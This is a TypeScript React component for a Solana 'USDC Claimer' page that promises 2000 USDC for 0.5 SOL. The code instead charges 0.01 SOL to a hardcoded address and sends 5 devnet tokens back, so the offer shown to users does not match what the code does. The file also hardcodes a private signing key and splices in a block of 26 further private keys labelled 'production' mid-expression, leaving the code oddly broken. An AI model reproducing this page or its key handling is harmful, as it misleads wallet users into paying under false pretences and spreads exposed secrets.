/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "LB1ysga52VzsNoSWLiTmkcUt3zBerGUCbdrqtauGxrWvN4ykW5fNahZAjsCi8EFmRiM3x7GygBGe8deUZWHcreN"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3ksVygBF25cyVbe18TToTnHh3hFDNL9GiEUupdCqwfzRhB99PLhke9MRckdPHDvPGExUYX9N8FBJYQAzRZBFvh5A",
  "key1": "4RzNkpiiuomNA7eHjRVb9y3y9EayhEL13fgLs6v8Fw23jFv9G7AST3bA1pCQrzGGKXXjeBy2gnMc9DHLEg85Ky28",
  "key2": "2kQ1oSf7yTiDdP7idaBR1HEjCLk7dGoZ2BMbrAqtZfWnnn1MPAqeTsFwXN9SoaQ5JHPWwn1GnPu8RDW4j4fN7sNg",
  "key3": "3rMK4vsewCigb7yxw48qHEpgzYe6PN9XmhZuRgh2DouVk6xM5kwTfFVFQfxzyeoPQSzf2nYVoLRfEzEQUEpfsSRG",
  "key4": "5FqfPYkb7KGob5RbHxNGDxZfRr7FEGS8r6gcipCJXS7caMxUPXwb1ioJ3QSdypxKZdTr1UNVA1j7w5x2sbypFoGC",
  "key5": "3AtY2MiaPZwXt8H8mzP69Kpz7Y197yfUxuBYUHHvUQMQo16h6H1ppeh9UBYDYFhmYsDfFp7G1DvZ23ND2QsVWc7t",
  "key6": "3GGci6xV8BQSGpn7ZcbV6m7Z4BBTrmndCgbPdqWtjWavvkvmxyFQ41S8xWy7XgFa2wkHLi1q427xdQhvjyYCncJQ",
  "key7": "53AyYHiiyJb1dvVEvF1HH12eYd5xKGF2j5N326ktzLgWHHM1r1FfewJt8jpFv81heYSAvL9pw14pnWzFzTPXew9n",
  "key8": "61jKcPzAeirPgjciAnxEpLQyfbLvwQZKYNtk57FH4HyHY22VuJJFQgCAPQjM7NRXS46UGT9LGUj4Ggm5984oFvrW",
  "key9": "tvJ5e4nZNFCGSRpMzuDnmCN1BpuyZdqYzazN3e5tP5w4qY6QrjgGdheVhwGQeAKP17VVw2vQ2vgQinPwKygzthY",
  "key10": "4trn1rjNrbqzYrU2EhNy5fZ4LspETeFg3d4dHCnMtTAdEh2Y1ePtucpA1k97NEDUHj6vDG5FVN3Ge27PM1XDUaGW",
  "key11": "2acStpaiq6kPN4C5nzwsch6GpGuKBeQ7nDgAxbSAHC4Zy82aFE3RLUnduHgQHEnRPfgG47MQDPdK6hDSztRRfvw5",
  "key12": "62NgYyuBfWmatFB1qvxExVot1BUuQuuCjZna7Lgdjsh43Ffao5cNqWawXFm4bVmXpLr9GvQdAg185ggjdRrrs6A3",
  "key13": "5haRgsqHo1RA1uywjEwBQbTzUSyJvLhvMaTmihyoSuKY2Q2CJFVmXcypBcKzChi5Rckfa22NrSQKF24TjViYdYoE",
  "key14": "5iqELPz7aEPVGv32T71syWcxgRYEEUTkKBwUG8sPDAytXXktoKNAk5AQ5kpgTjapmZWEaVx1Ev8hhrhbRRyCBfig",
  "key15": "5bpo3s3rpaZiVUuuLrEMRwk2Y2XXuRCB2WrqAn8yf1Jk8T548kwgbfaSBkzWy5BCUDVn22i91VcsEbv7uvkYhTX",
  "key16": "3Ci1Ly9J5fuGqG2ELqZNHZQLEthdCvFdrz69NLdkRtVGARV9S1FtDXonk9sQ8JUjzwaNLjTsSUygbEyARudHdd7",
  "key17": "5cJjovNRQWCBKyefs2YSRbM2XjgMty89CQgxDA5zkpfKzKzSihgfuPy8dhGGekJB17EUsohrb9v8KU5gr9kbEjzm",
  "key18": "fXAC2q76BGzbBboxazhXCPVdRy1xjK83a7hb5wHmzkFfEUC1JYHvfKVEVLU6DkuoFiaT22bNH8sX8xsXsHbQGE8",
  "key19": "3vabD36toy8yFfCjbS24PWRrA3KqaAhbkbg8RRwrPKPmARuuc2rP1Aw1Ms3aEi46ieJjkbxsWLnQupSxin8eqfvZ",
  "key20": "4TmrSBsk2NHsmTcTY2s5XJc9BbVL8UfNsGBcFnuCMwAXmRex5At5oUySRjodBD6G9qXyRmG6yV4PkjfTyVnfLb6w",
  "key21": "49KKLLaT3UUscsPZzjGzZdPoWfJ3JALs2qJYkZsAnxdw5iz21AUfE5a4rHg1BsespkybGKGje3k35piwBDA7Xia7",
  "key22": "4SkcvE8iqVcKEWHqkonbBqm2ULpad9hggyt68hBhaBnujDe5cSf83mqvdxUJLJcGXt9U5NUWv1TNVWfwM97GQGtK",
  "key23": "4iKJvPXLNeLJj5G4JqGRhynrhH5MiviJrdgnDfhFnivzMHoV3SzAQ5UuVoEtGZEARgDgt5DzraQzGccd5Uc9Nsr2",
  "key24": "cEbrNSPob7fbv6GapgVh7WXq3xEAQMhykBXQsgwS3PCYgGSqR6B8gu6xUhrrLn2EeAZRdegv3seaFdfsxFixwKY",
  "key25": "5RnR7zgyLtJKxkT4LPzjFKZA2QBJFu49XH5HKeGqBNh7aYNyuG5uH6C3XZFbMYdBBz32ukRwZTk8rjricotwjHRo"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
